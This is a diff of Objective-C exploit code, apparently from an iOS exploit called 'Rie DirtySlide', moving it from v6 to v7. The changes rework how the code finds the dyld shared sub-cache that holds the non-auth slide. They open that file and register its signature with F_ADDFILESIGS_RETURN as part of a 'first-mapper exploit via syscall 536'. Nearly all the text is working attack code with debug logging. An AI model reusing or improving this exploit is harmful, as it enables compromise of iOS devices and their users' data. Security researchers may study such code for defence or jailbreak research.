@@ -142,7 +142,7 @@ typedef struct {
     self.logView.editable = NO;
     [self.view addSubview:self.logView];
 
-    [self log:@"=== Rie DirtySlide v6 ==="];
+    [self log:@"=== Rie DirtySlide v7 ==="];
     [self log:[NSString stringWithFormat:@"State: %@", self.isRelaunched ? @"RELAUNCH (RESLIDE)" : @"First run"]];
     [self log:@""];
 
@@ -308,10 +308,10 @@ typedef struct {
     }
 }
 
-// ── Stage 3: First-mapper exploit via syscall 536 (v6: 3-file/3-mapping, ref pattern) ──
+// ── Stage 3: First-mapper exploit via syscall 536 (v7: fixed sub-cache lookup) ──
 - (void)runFirstMapper {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self log:@"\n── Stage 3: Rie v6 First-Mapper ──"];
+        [self log:@"\n── Stage 3: Rie v7 First-Mapper ──"];
         [self clearRelaunchFlag];
 
         long (*sc)(int, ...) = dlsym(RTLD_DEFAULT, "syscall");
@@ -341,6 +341,7 @@ typedef struct {
         uint64_t csOff = 0, csSz = 0;
         int foundNA = -1;
 
+        int subIdx = -1; // which sub-cache (0-indexed) has the non-auth slide
         rie_mach_vm_address_t walk = srBase;
         rie_mach_vm_address_t srEnd = srBase + 0x100000000ULL; // 4GB scan range
         for (int segIdx = 0; segIdx < 100; segIdx++) {
@@ -360,12 +361,18 @@ typedef struct {
                 (rie_mach_vm_address_t)(uintptr_t)buf, &outSz);
             if (kr == KERN_SUCCESS && outSz >= 16 && memcmp(buf, "dyld_v1", 7) == 0) {
                 if (segIdx == 0) mainHdrAddr = walk;
+                int curSubIdx = segIdx - 1; // 0 = main, sub-caches start at index 0
                 uint32_t mws_off = *(uint32_t*)(buf + 0x138);
                 uint32_t mws_cnt = *(uint32_t*)(buf + 0x13c);
-                uint32_t sub_off = *(uint32_t*)(buf + 0x188);
-                uint32_t sub_cnt = *(uint32_t*)(buf + 0x18c);
-                [self log:[NSString stringWithFormat:@"dyld_v1[%d]: a=0x%llx mws=%u sub=%u",
-                    segIdx, (unsigned long long)walk, mws_cnt, sub_cnt]];
+                if (segIdx > 0) {
+                    [self log:[NSString stringWithFormat:@"dyld_v1[sub%d]: a=0x%llx mws=%u",
+                        curSubIdx, (unsigned long long)walk, mws_cnt]];
+                } else {
+                    uint32_t sub_off = *(uint32_t*)(buf + 0x188);
+                    uint32_t sub_cnt = *(uint32_t*)(buf + 0x18c);
+                    [self log:[NSString stringWithFormat:@"dyld_v1[main]: a=0x%llx mws=%u sub=%u",
+                        (unsigned long long)walk, mws_cnt, sub_cnt]];
+                }
 
                 uint8_t *fullHdr = (uint8_t *)malloc(0x10000);
                 if (fullHdr) {
@@ -394,6 +401,7 @@ typedef struct {
                                 naSlide = sl; naFlags = fl;
                                 naMax = mp; naInit = ip;
                                 naHdrAddr = walk;
+                                subIdx = curSubIdx;
                                 csOff = *(uint64_t*)(fullHdr + 0x028);
                                 csSz  = *(uint64_t*)(fullHdr + 0x030);
                             }
@@ -497,51 +505,57 @@ typedef struct {
         }
 
         // ── Determine slide carrier fd ──
-        // If non-auth slide was found in the main cache header, use fd_main.
-        // Otherwise it's in a sub-cache — try to find and open it.
-        int fd_sub = fd_main; // default: main cache contains non-auth slide
-        if (naHdrAddr != mainHdrAddr) {
-            [self log:[NSString stringWithFormat:@"Non-auth slide in sub-cache (hdr=0x%llx != main=0x%llx)",
-                naHdrAddr, mainHdrAddr]];
-            // Parse main header for subCacheArray, find matching sub-cache
-            uint8_t mainHdr[0x1000];
-            rie_mach_vm_size_t got = 0;
-            if (vmr(mach_task_self(), mainHdrAddr, 0x1000,
-                (rie_mach_vm_address_t)(uintptr_t)mainHdr, &got) == KERN_SUCCESS) {
-                uint32_t sub_off = *(uint32_t*)(mainHdr + 0x188);
-                uint32_t sub_cnt = *(uint32_t*)(mainHdr + 0x18c);
-                [self log:[NSString stringWithFormat:@"subCacheArray: off=0x%x cnt=%u", sub_off, sub_cnt]];
-                for (uint32_t si = 0; si < sub_cnt && si < 10; si++) {
-                    size_t eo = (size_t)sub_off + (size_t)si * 56;
-                    if (eo + 56 > 0x1000) break;
-                    char suffix[33] = {0};
-                    memcpy(suffix, mainHdr + eo + 24, 32);
-                    for (int ci = 0; ci < nDirs && fd_sub == fd_main; ci++) {
-                        char sp[1024];
-                        snprintf(sp, sizeof(sp), "%s%s%s", cacheDirs[ci], cacheName, suffix);
-                        int sfd = open(sp, O_RDONLY);
-                        if (sfd >= 0) {
-                            // Verify this sub-cache has the non-auth slide
-                            uint8_t sh[0x40]; pread(sfd, sh, 0x40, 0);
-                            if (memcmp(sh, "dyld_v1", 7) == 0) {
-                                fd_sub = sfd;
-                                [self log:[NSString stringWithFormat:@"sub-cache OPEN: %s fd=%d", sp, fd_sub]];
-                                uint64_t sco = *(uint64_t*)(sh+0x28), scsz = *(uint64_t*)(sh+0x30);
-                                rie_fsignatures_t fs2; memset(&fs2, 0, sizeof(fs2));
-                                fs2.fs_file_start = (off_t)sco;
-                                fs2.fs_blob_start = NULL;
-                                fs2.fs_blob_size  = (size_t)scsz;
-                                int rc2 = fcntl(sfd, F_ADDFILESIGS_RETURN, &fs2);
-                                [self log:[NSString stringWithFormat:@"F_ADDFILESIGS(sub) rc=%d cs=0x%llx+0x%llx", rc2, sco, scsz]];
-                            } else {
-                                close(sfd);
+        int fd_sub = fd_main;
+        if (naHdrAddr != mainHdrAddr && subIdx >= 0) {
+            [self log:[NSString stringWithFormat:@"Non-auth slide in sub-cache #%d (hdr=0x%llx)",
+                subIdx, naHdrAddr]];
+            // Read main cache header to get subCacheArray entry for this sub-cache
+            size_t mainReadSz = 0x50000;
+            uint8_t *mainBuf = (uint8_t *)malloc(mainReadSz);
+            if (mainBuf) {
+                memset(mainBuf, 0, mainReadSz);
+                rie_mach_vm_size_t got = 0;
+                if (vmr(mach_task_self(), mainHdrAddr, mainReadSz,
+                    (rie_mach_vm_address_t)(uintptr_t)mainBuf, &got) == KERN_SUCCESS) {
+                    uint32_t sub_off = *(uint32_t*)(mainBuf + 0x188);
+                    uint32_t sub_cnt = *(uint32_t*)(mainBuf + 0x18c);
+                    [self log:[NSString stringWithFormat:@"subCacheArray: off=0x%x cnt=%u looking for #%d",
+                        sub_off, sub_cnt, subIdx]];
+                    if ((uint32_t)subIdx < sub_cnt) {
+                        size_t eo = (size_t)sub_off + (size_t)subIdx * 56;
+                        if (eo + 56 <= got) {
+                            char suffix[33] = {0};
+                            memcpy(suffix, mainBuf + eo + 24, 32);
+                            for (int ti = 31; ti >= 0; ti--) {
+                                if (suffix[ti] == ' ' || suffix[ti] == 0) suffix[ti] = 0; else break;
+                            }
+                            [self log:[NSString stringWithFormat:@"sub-cache suffix: \"%s\"", suffix]];
+                            if (suffix[0]) {
+                                for (int ci = 0; ci < nDirs && fd_sub == fd_main; ci++) {
+                                    char sp[1024];
+                                    snprintf(sp, sizeof(sp), "%s%s%s", cacheDirs[ci], cacheName, suffix);
+                                    int sfd = open(sp, O_RDONLY);
+                                    if (sfd >= 0) {
+                                        fd_sub = sfd;
+                                        [self log:[NSString stringWithFormat:@"sub-cache OPEN: %s fd=%d", sp, fd_sub]];
+                                        uint8_t sh[0x40]; pread(sfd, sh, 0x40, 0);
+                                        uint64_t sco = *(uint64_t*)(sh+0x28), scsz = *(uint64_t*)(sh+0x30);
+                                        rie_fsignatures_t fs2; memset(&fs2, 0, sizeof(fs2));
+                                        fs2.fs_file_start = (off_t)sco;
+                                        fs2.fs_blob_start = NULL;
+                                        fs2.fs_blob_size  = (size_t)scsz;
+                                        int rc2 = fcntl(sfd, F_ADDFILESIGS_RETURN, &fs2);
+                                        [self log:[NSString stringWithFormat:@"F_ADDFILESIGS(sub) rc=%d cs=0x%llx+0x%llx", rc2, sco, scsz]];
+                                    }
+                                }
                             }
                         }
                     }
                 }
+                free(mainBuf);
             }
             if (fd_sub == fd_main) {
-                [self log:@"!! Could not open sub-cache with non-auth slide — using main fd anyway"];
+                [self log:@"!! Could not open sub-cache file — using main fd (will fail)"];
             }
         }
 
